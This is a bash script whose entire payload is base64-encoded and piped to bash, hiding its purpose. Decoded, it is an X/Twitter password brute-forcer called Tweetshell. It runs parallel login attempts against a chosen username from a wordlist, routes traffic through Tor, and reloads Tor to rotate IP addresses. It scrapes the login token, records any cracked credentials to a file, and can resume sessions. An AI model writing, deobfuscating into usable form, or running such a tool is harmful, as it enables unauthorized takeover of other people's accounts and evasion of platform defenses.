#!/bin/bash
# Obfuscated by Mr.X
bash <(echo 'IyEvYmluL2Jhc2gKIyBUd2VldHNoZWxsIHYxLjEg4oaSIFggQnJ1dGVGb3JjZXIgKEN5YmVycHVuayBOZW9uIEVkaXRpb24pCiMgQ29kZWQgYnk6IGdpdGh1Yi5jb20vV2hvbXJ4NjY2CiMgVXBkYXRlZCBmb3IgWC5jb20gKDIwMjUpIHwgQ3liZXJwdW5rIFRoZW1lIChQdXJwbGUgTmVvbikKCiMgQU5TSSBDeWJlcnB1bmsgQ29sb3JzCk5FT05fUFVSUExFPSdcZVszODs1Ozk5bScKTkVPTl9QSU5LPSdcZVszODs1OzEyOW0nCk5FT05fQ1lBTj0nXGVbMzg7NTs0NW0nCkJSSUdIVF9XSElURT0nXGVbMTs5N20nCkJSSUdIVF9HUkVFTj0nXGVbMTs5Mm0nCkJSSUdIVF9SRUQ9J1xlWzE7OTFtJwpSRVNFVD0nXGVbMG0nCgp0cmFwICdzdG9yZTsgZXhpdCAxJyBJTlQKCmNoZWNrcm9vdCgpIHsKICBwcmludGYgIiR7QlJJR0hUX1dISVRFfVdlbGNvbWUgdG8gbXkgY3VzdG9taXplISR7UkVTRVR9XG4iCn0KCmRlcGVuZGVuY2llcygpIHsKICBjb21tYW5kIC12IHRvciA+L2Rldi9udWxsIDI+JjEgfHwgeyBlY2hvID4mMiAiJHtCUklHSFRfUkVEfUkgcmVxdWlyZSB0b3IgYnV0IGl0J3Mgbm90IGluc3RhbGxlZC4gUnVuIC4vaW5zdGFsbC5zaC4gQWJvcnRpbmcuJHtSRVNFVH0iOyBleGl0IDE7IH0KICBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyA+JjIgIiR7QlJJR0hUX1JFRH1JIHJlcXVpcmUgY3VybCBidXQgaXQncyBub3QgaW5zdGFsbGVkLiBSdW4gLi9pbnN0YWxsLnNoLiBBYm9ydGluZy4ke1JFU0VUfSI7IGV4aXQgMTsgfQp9CgpiYW5uZXIoKSB7CiAgcHJpbnRmICIke05FT05fUFVSUExFfSAgICAgIF8gIF8gICAgIF9fX19fICAgICAgICAgICAgICAgICBfICAke05FT05fQ1lBTn0gICAgIF8gICAgICAgICAgXyBfICAke1JFU0VUfVxuIgogIHByaW50ZiAiJHtORU9OX1BVUlBMRX0gICAgX3wgfHwgfF8gIHxfICAgX3wgICAgICAgICAgICAgICB8IHwgJHtORU9OX0NZQU59ICAgIHwgfCAgICAgICAgfCB8IHwgJHtSRVNFVH1cbiIKICBwcmludGYgIiR7TkVPTl9QVVJQTEV9ICAgfF8gIF9fICBffCAgIHwgfF8gICAgICBfX19fXyAgX19ffCB8XyR7TkVPTl9DWUFOfSBfX198IHxfXyAgIF9fX3wgfCB8ICR7UkVTRVR9XG4iCiAgcHJpbnRmICIke05FT05fUFVSUExFfSAgICBffCB8fCB8XyAgICB8IFxcIFxcIC9cXCAvIC8gXyBcXC8gXyBcXCBfXyR7TkVPTl9DWUFOfS8gX198ICdfIFxcIC8gXyBcXCB8IHwgJHtSRVNFVH1cbiIKICBwcmludGYgIiR7TkVPTl9QVVJQTEV9ICAgfF8gIF9fICBffCAgIHwgfFxcIFYgIFYgLyAgX18vICBfXy8gfF8ke05FT05fQ1lBTn1cXF9fIFxcIHwgfCB8ICBfXy8gfCB8ICR7UkVTRVR9XG4iCiAgcHJpbnRmICIke05FT05fUFVSUExFfSAgICAgfF98fF98ICAgICBcXF8vIFxcXy9cXF8vIFxcX19ffFxcX19ffFxcX18ke05FT05fQ1lBTn18X19fL198IHxffFxcX19ffF98X3wgJHtSRVNFVH1cbiIKICBwcmludGYgIlxuIgogIHByaW50ZiAiJHtCUklHSFRfV0hJVEV9XGVbNDg7NTs1N20gWCBCcnV0ZUZvcmNlciB2MS4xIC0gQXV0aG9yOiBNci5YIChHaXRodWIvSUcpICR7UkVTRVR9XG4iCiAgcHJpbnRmICJcbiIKfQoKc3RhcnQoKSB7CiAgYmFubmVyCiAgY2hlY2tyb290CiAgZGVwZW5kZW5jaWVzCgogIHJlYWQgLXAgJCdVc2VybmFtZSBhY2NvdW50OiAnIHVzZXJuYW1lCiAgaWYgW1sgLXogIiR1c2VybmFtZSIgXV07IHRoZW4KICAgIHByaW50ZiAiJHtCUklHSFRfUkVEfVVzZXJuYW1lIGNhbm5vdCBiZSBlbXB0eSEke1JFU0VUfVxuIgogICAgc2xlZXAgMQogICAgc3RhcnQKICBmaQoKICAjIENlayBrZWJlcmFkYWFuIGFrdW4gdmlhIFggKHZlcnNpIG1vYmlsZSBsZWJpaCBzdGFiaWwpCiAgY2hlY2thY2NvdW50PSQoY3VybCAtTCAtcyAiaHR0cHM6Ly9tb2JpbGUudHdpdHRlci5jb20vJHVzZXJuYW1lIiB8IGdyZXAgLWMgIlNvbWV0aGluZyB3ZW50IHdyb25nIikKICAjIENhdGF0YW46IFggdGlkYWsgbWVtYmVyaWthbiAiNDA0IiBqZWxhcyDigJQgamFkaSBpbmkgcGVuZGVrYXRhbiB0ZXJiYXRhcwogICMgSmlrYSBoYWxhbWFuIGVycm9yIG11bmN1bCwgbXVuZ2tpbiBidWthbiBiZXJhcnRpIGFrdW4gdGlkYWsgYWRhIOKAlCB0YXBpIGtpdGEgYXN1bXNpa2FuIHNlbWVudGFyYQogICMgQWx0ZXJuYXRpZjogYmlhcmthbiB1c2VyIGxhbmp1dCBzYWphIChrYXJlbmEgWCBzZXJpbmcgZXJyb3IgZmFsc2UgcG9zaXRpdmUpCgogIGRlZmF1bHRfd2xfcGFzcz0icGFzc3dvcmRzLmxzdCIKICByZWFkIC1wICQnUGFzc3dvcmQgTGlzdCAoRW50ZXIgdG8gdXNlIGRlZmF1bHQpOiAnIHdsX3Bhc3MKICB3bF9wYXNzPSIke3dsX3Bhc3M6LSRkZWZhdWx0X3dsX3Bhc3N9IgogIGlmIFtbICEgLWYgIiR3bF9wYXNzIiBdXTsgdGhlbgogICAgcHJpbnRmICIke0JSSUdIVF9SRUR9V29yZGxpc3QgZmlsZSBub3QgZm91bmQhJHtSRVNFVH1cbiIKICAgIGV4aXQgMQogIGZpCgogIGRlZmF1bHRfdGhyZWFkcz0iMTAiCiAgcmVhZCAtcCAkJ1RocmVhZHMgKFVzZSA8IDIwLCBEZWZhdWx0IDEwKTogJyB0aHJlYWRzCiAgdGhyZWFkcz0iJHt0aHJlYWRzOi0kZGVmYXVsdF90aHJlYWRzfSIKICBpZiAhIFtbICIkdGhyZWFkcyIgPX4gXlswLTldKyQgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgMjAgXV0gfHwgW1sgIiR0aHJlYWRzIiAtbHQgMSBdXTsgdGhlbgogICAgdGhyZWFkcz0xMAogIGZpCn0KCmNoZWNrdG9yKCkgewogIHByaW50ZiAiJHtCUklHSFRfR1JFRU59WypdIENoZWNraW5nIFRvciBjb25uZWN0aW9uLi4uJHtSRVNFVH1cbiIKICBpZiAhIGN1cmwgLXMgLS1zb2NrczUtaG9zdG5hbWUgbG9jYWxob3N0OjkwNTAgLW0gMTAgaHR0cHM6Ly9jaGVjay50b3Jwcm9qZWN0Lm9yZyB8IGdyZXAgLXEgIkNvbmdyYXR1bGF0aW9ucyI7IHRoZW4KICAgIHByaW50ZiAiJHtCUklHSFRfUkVEfVshXSBUb3IgaXMgbm90IHdvcmtpbmcuIE1ha2Ugc3VyZSBUb3IgaXMgcnVubmluZy4ke1JFU0VUfVxuIgogICAgZXhpdCAxCiAgZmkKfQoKc3RvcmUoKSB7CiAgaWYgW1sgLXogIiR1c2VybmFtZSIgXV07IHRoZW4gZXhpdCAxOyBmaQogIHByaW50ZiAiJHtCUklHSFRfUkVEfVsqXSBXYWl0aW5nIGZvciBhY3RpdmUgdGhyZWFkcyB0byBmaW5pc2guLi4ke1JFU0VUfVxuIgogIHNsZWVwIDMKICBybSAtZiBjb29raWVzKgoKICByZWFkIC1wICQnU2F2ZSBzZXNzaW9uIGZvciB1c2VyICciJHVzZXJuYW1lIiQnPyBbWS9uXTogJyBzZXNzaW9uCiAgc2Vzc2lvbj0iJHtzZXNzaW9uOi1ZfSIKICBpZiBbWyAiJHNlc3Npb24iID1+IF5bWXldIF1dOyB0aGVuCiAgICBbWyAhIC1kIHNlc3Npb25zIF1dICYmIG1rZGlyIC1wIHNlc3Npb25zCiAgICBsb2NhbCB0aW1lc3RhbXA9JChkYXRlICsiJUZUJUglTSIpCiAgICBwcmludGYgInVzZXJuYW1lPVwiJXNcIlxud2xfcGFzcz1cIiVzXCJcbnRva2VuPVwiJXNcIlxuIiAiJHVzZXJuYW1lIiAiJHdsX3Bhc3MiICIkdG9rZW4iID4gInNlc3Npb25zL3N0b3JlLnNlc3Npb24uJHVzZXJuYW1lLiR0aW1lc3RhbXAiCiAgICBwcmludGYgIiR7QlJJR0hUX1dISVRFfVsrXSBTZXNzaW9uIHNhdmVkLiR7UkVTRVR9XG4iCiAgICBwcmludGYgIiR7QlJJR0hUX0dSRUVOfVVzZSAuL3R3ZWV0c2hlbGwuc2ggLS1yZXN1bWUgdG8gcmVzdW1lLiR7UkVTRVR9XG4iCiAgZmkKICBleGl0IDEKfQoKY2hhbmdlaXAoKSB7CiAga2lsbGFsbCAtSFVQIHRvciA+L2Rldi9udWxsIDI+JjEKICBzbGVlcCAyCn0KCmJydXRlZm9yY2VyKCkgewogIHVhZ2VudD0iTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiCiAgY2hlY2t0b3IKCiAgdG90YWxfbGluZXM9JCh3YyAtbCA8ICIkd2xfcGFzcyIpCiAgdG9rZW49MAogIHN0YXJ0bGluZT0xCgogIHByaW50ZiAiJHtCUklHSFRfR1JFRU59VXNlcm5hbWU6JHtSRVNFVH0gJHtCUklHSFRfV0hJVEV9JXMke1JFU0VUfVxuIiAiJHVzZXJuYW1lIgogIHByaW50ZiAiJHtCUklHSFRfR1JFRU59V29yZGxpc3Q6JHtSRVNFVH0gJHtCUklHSFRfV0hJVEV9JXMgKCVkIGxpbmVzKSR7UkVTRVR9XG4iICIkd2xfcGFzcyIgIiR0b3RhbF9saW5lcyIKICBwcmludGYgIiR7QlJJR0hUX1JFRH1bKl0gUHJlc3MgQ3RybCtDIHRvIHN0b3Agb3Igc2F2ZSBzZXNzaW9uJHtSRVNFVH1cbiIKCiAgY2hhbmdlaXAKCiAgd2hpbGUgW1sgJHN0YXJ0bGluZSAtbGUgJHRvdGFsX2xpbmVzIF1dOyBkbwogICAgZW5kbGluZT0kKChzdGFydGxpbmUgKyB0aHJlYWRzIC0gMSkpCiAgICBpZiBbWyAkZW5kbGluZSAtZ3QgJHRvdGFsX2xpbmVzIF1dOyB0aGVuCiAgICAgIGVuZGxpbmU9JHRvdGFsX2xpbmVzCiAgICBmaQoKICAgIGZvciAoKGk9c3RhcnRsaW5lOyBpPD1lbmRsaW5lOyBpKyspKTsgZG8KICAgICAgcGFzc3dvcmQ9JChzZWQgLW4gIiR7aX1wIiAiJHdsX3Bhc3MiKQogICAgICB0b2tlbj0kKChpKSkKICAgICAgQ09PS0lFUz0iY29va2llcy4kaSIKCiAgICAgIHByaW50ZiAiJHtCUklHSFRfV0hJVEV9VHJ5aW5nIHBhc3MgKCVkLyVkKToke1JFU0VUfSAlc1xuIiAiJHRva2VuIiAiJHRvdGFsX2xpbmVzIiAiJHBhc3N3b3JkIgoKICAgICAgewogICAgICAgICMgQW1iaWwgaGFsYW1hbiBsb2dpbiBkYXJpIFggKG1vYmlsZS50d2l0dGVyLmNvbSBtYXNpaCBha3RpZikKICAgICAgICBpbml0cGFnZT0kKGN1cmwgLS1zb2NrczUtaG9zdG5hbWUgbG9jYWxob3N0OjkwNTAgLXMgLWIgIiRDT09LSUVTIiAtYyAiJENPT0tJRVMiIC1MIC1BICIkdWFnZW50IiAiaHR0cHM6Ly9tb2JpbGUudHdpdHRlci5jb20vc2Vzc2lvbi9uZXciKQogICAgICAgIAogICAgICAgICMgQ2VrIGFwYWthaCBoYWxhbWFuIGVycm9yIChiZXJkYXNhcmthbiBrbm93bGVkZ2UgYmFzZSkKICAgICAgICBpZiBbWyAiJGluaXRwYWdlIiA9PSAqIlNvbWV0aGluZyB3ZW50IHdyb25nIiogXV07IHRoZW4KICAgICAgICAgIHByaW50ZiAiJHtCUklHSFRfUkVEfVshXSBYLmNvbSByZXR1cm5lZCBlcnJvciAocG9zc2libGUgVG9yIGJsb2NrKS4gU2tpcHBpbmcuJHtSRVNFVH1cbiIKICAgICAgICAgIHJtIC1mICIkQ09PS0lFUyIKICAgICAgICAgIHJldHVybgogICAgICAgIGZpCgogICAgICAgIHRva2VudD0kKGVjaG8gIiRpbml0cGFnZSIgfCBncmVwIC1vUCAnbmFtZT0iYXV0aGVudGljaXR5X3Rva2VuIiB2YWx1ZT0iXEtbXiJdKycpCiAgICAgICAgaWYgW1sgLXogIiR0b2tlbnQiIF1dOyB0aGVuCiAgICAgICAgICBybSAtZiAiJENPT0tJRVMiCiAgICAgICAgICByZXR1cm4KICAgICAgICBmaQoKICAgICAgICByZXNwb25zZT0kKGN1cmwgLS1zb2NrczUtaG9zdG5hbWUgbG9jYWxob3N0OjkwNTAgLXMgLWIgIiRDT09LSUVTIiAtYyAiJENPT0tJRVMiIC1MIC1BICIkdWFnZW50IiBcCiAgICAgICAgICAtZCAiYXV0aGVudGljaXR5X3Rva2VuPSR0b2tlbnQmc2Vzc2lvblt1c2VybmFtZV9vcl9lbWFpbF09JHVzZXJuYW1lJnNlc3Npb25bcGFzc3dvcmRdPSRwYXNzd29yZCZyZW1lbWJlcl9tZT0xJndmYT0xJmNvbW1pdD1Mb2craW4iIFwKICAgICAgICAgICJodHRwczovL21vYmlsZS50d2l0dGVyLmNvbS9zZXNzaW9ucyIpCgogICAgICAgICMgUG9sYSBzdWtzZXM6IGFsaWhrYW4ga2UgaGFsYW1hbiB1dGFtYSBhdGF1IHZlcmlmaWthc2kKICAgICAgICBpZiBbWyAiJHJlc3BvbnNlIiA9PSAqImNvbXBvc2UvdHdlZXQiKiBdXSB8fCBbWyAiJHJlc3BvbnNlIiA9PSAqIi9hY2NvdW50L2xvZ2luX3ZlcmlmaWNhdGlvbiIqIF1dIHx8IFtbICIkcmVzcG9uc2UiID09ICoiL2FjY291bnQvbG9naW5fY2hhbGxlbmdlIiogXV0gfHwgW1sgIiRyZXNwb25zZSIgPT0gKiJ4LmNvbS9ob21lIiogXV07IHRoZW4KICAgICAgICAgIHByaW50ZiAiXG4ke0JSSUdIVF9HUkVFTn1bK10gUGFzc3dvcmQgRm91bmQ6ICVzJHtSRVNFVH1cbiIgIiRwYXNzd29yZCIKICAgICAgICAgIHByaW50ZiAiVXNlcm5hbWU6ICVzLCBQYXNzd29yZDogJXNcbiIgIiR1c2VybmFtZSIgIiRwYXNzd29yZCIgPj4gZm91bmQueHNoZWxsCiAgICAgICAgICBwcmludGYgIiR7QlJJR0hUX0dSRUVOfVsrXSBTYXZlZCB0bzoke1JFU0VUfSR7QlJJR0hUX1dISVRFfSBmb3VuZC54c2hlbGwke1JFU0VUfVxuIgogICAgICAgICAgcm0gLWYgY29va2llcy4qCiAgICAgICAgICBzdG9yZV9zdWNjZXNzCiAgICAgICAgZmkKCiAgICAgICAgcm0gLWYgIiRDT09LSUVTIgogICAgICB9ICYKICAgIGRvbmUKCiAgICB3YWl0CiAgICBjaGFuZ2VpcAogICAgc3RhcnRsaW5lPSQoKGVuZGxpbmUgKyAxKSkKICBkb25lCgogIHByaW50ZiAiJHtCUklHSFRfUkVEfVshXSBXb3JkbGlzdCBleGhhdXN0ZWQuIE5vIHZhbGlkIHBhc3N3b3JkIGZvdW5kLiR7UkVTRVR9XG4iCiAgc3RvcmUKfQoKc3RvcmVfc3VjY2VzcygpIHsKICBraWxsIC05ICQkCn0KCnJlc3VtZSgpIHsKICBiYW5uZXIKICBjaGVja3RvcgoKICBpZiBbWyAhIC1kIHNlc3Npb25zIF1dIHx8IFtbIC16ICIkKGxzIHNlc3Npb25zL3N0b3JlLnNlc3Npb24qIDI+L2Rldi9udWxsKSIgXV07IHRoZW4KICAgIHByaW50ZiAiJHtCUklHSFRfUkVEfVsqXSBObyBzYXZlZCBzZXNzaW9ucyBmb3VuZC4ke1JFU0VUfVxuIgogICAgZXhpdCAxCiAgZmkKCiAgcHJpbnRmICIke0JSSUdIVF9HUkVFTn1BdmFpbGFibGUgc2Vzc2lvbnM6JHtSRVNFVH1cbiIKICBsb2NhbCBpPTEKICBmb3Igc2Vzc2lvbl9maWxlIGluIHNlc3Npb25zL3N0b3JlLnNlc3Npb24uKjsgZG8KICAgIFtbICEgLWYgIiRzZXNzaW9uX2ZpbGUiIF1dICYmIGNvbnRpbnVlCiAgICBzb3VyY2UgIiRzZXNzaW9uX2ZpbGUiIDI+L2Rldi9udWxsCiAgICBwcmludGYgIiR7QlJJR0hUX0dSRUVOfSVkKSR7UkVTRVR9ICR7QlJJR0hUX1dISVRFfSVzJHtSRVNFVH0gKGxhc3QgdHJpZWQ6ICR7QlJJR0hUX0dSRUVOfSVzJHtSRVNFVH0pXG4iICIkaSIgIiQoYmFzZW5hbWUgIiRzZXNzaW9uX2ZpbGUiKSIgIiR0b2tlbiIKICAgICgoaSsrKSkKICBkb25lCgogIHJlYWQgLXAgJCdDaG9vc2Ugc2Vzc2lvbiBudW1iZXI6ICcgY2hvaWNlCiAgc2Vzc2lvbl9maWxlPSQobHMgc2Vzc2lvbnMvc3RvcmUuc2Vzc2lvbi4qIHwgc2VkIC1uICIke2Nob2ljZX1wIikKICBpZiBbWyAhIC1mICIkc2Vzc2lvbl9maWxlIiBdXTsgdGhlbgogICAgcHJpbnRmICIke0JSSUdIVF9SRUR9SW52YWxpZCBzZWxlY3Rpb24uJHtSRVNFVH1cbiIKICAgIGV4aXQgMQogIGZpCgogIHNvdXJjZSAiJHNlc3Npb25fZmlsZSIKICBkZWZhdWx0X3RocmVhZHM9MTAKICByZWFkIC1wICQnVGhyZWFkcyAoVXNlIDwgMjAsIERlZmF1bHQgMTApOiAnIHRocmVhZHMKICB0aHJlYWRzPSIke3RocmVhZHM6LSRkZWZhdWx0X3RocmVhZHN9IgogIGlmICEgW1sgIiR0aHJlYWRzIiA9fiBeWzAtOV0rJCBdXSB8fCBbWyAiJHRocmVhZHMiIC1ndCAyMCBdXSB8fCBbWyAiJHRocmVhZHMiIC1sdCAxIF1dOyB0aGVuCiAgICB0aHJlYWRzPTEwCiAgZmkKCiAgcHJpbnRmICIke0JSSUdIVF9HUkVFTn1bKl0gUmVzdW1pbmcgZm9yIHVzZXI6JHtSRVNFVH0gJHtCUklHSFRfV0hJVEV9JXMke1JFU0VUfVxuIiAiJHVzZXJuYW1lIgogIHByaW50ZiAiJHtCUklHSFRfR1JFRU59WypdIFdvcmRsaXN0OiR7UkVTRVR9ICR7QlJJR0hUX1dISVRFfSVzJHtSRVNFVH1cbiIgIiR3bF9wYXNzIgogIHByaW50ZiAiJHtCUklHSFRfUkVEfVsqXSBQcmVzcyBDdHJsK0MgdG8gc3RvcCBvciBzYXZlIHNlc3Npb24ke1JFU0VUfVxuIgoKICBpZiBbWyAteiAiJHRva2VuIiBdXSB8fCAhIFtbICIkdG9rZW4iID1+IF5bMC05XSskIF1dOyB0aGVuIHRva2VuPTA7IGZpCiAgc3RhcnRsaW5lPSQoKHRva2VuICsgMSkpCiAgYnJ1dGVmb3JjZXIKfQoKY2FzZSAiJDEiIGluCiAgLS1yZXN1bWUpIHJlc3VtZSA7OwogICopIHN0YXJ0OyBicnV0ZWZvcmNlciA7Owplc2Fj' | base64 -d)
